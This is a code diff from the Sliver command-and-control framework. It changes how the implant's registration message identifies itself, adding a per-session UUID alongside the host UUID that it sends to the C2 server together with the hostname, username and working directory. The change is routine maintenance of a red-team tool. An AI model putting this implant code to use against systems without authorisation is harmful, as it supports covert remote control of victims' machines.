@@ -33,6 +33,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
 
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -305,10 +306,21 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 		}
 	}
 
-	// Retrieve UUID
-	uuid := hostuuid.GetUUID()
+	// Generate a unique ID for this session only
+	sessUUID, err := uuid.NewV4()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to generate session UUID: %s", err)
+		// {{end}}
+	}
 	// {{if .Config.Debug}}
-	log.Printf("Uuid: %s", uuid)
+	log.Printf("Session UUID: %s", sessUUID)
+	// {{end}}
+
+	// Retrieve host UUID
+	hostUUID := hostuuid.GetUUID()
+	// {{if .Config.Debug}}
+	log.Printf("Host UUID: %s", hostUUID)
 	// {{end}}
 
 	workDir, _ := os.Getwd()
@@ -319,7 +331,7 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 	data, err := proto.Marshal(&sliverpb.Register{
 		Name:             consts.SliverName,
 		Hostname:         hostname,
-		Uuid:             uuid,
+		HostUUID:         hostUUID,
 		Username:         currentUser.Username,
 		Uid:              currentUser.Uid,
 		Gid:              currentUser.Gid,
@@ -331,6 +343,7 @@ func (t *C2) registerSliver() *sliverpb.Envelope {
 		ActiveC2:         t.uri.String(),
 		WorkingDirectory: workDir,
 		TransportID:      t.Profile.ID,
+		UUID:             sessUUID.String(),
 	})
 	if err != nil {
 		// {{if .Config.Debug}}
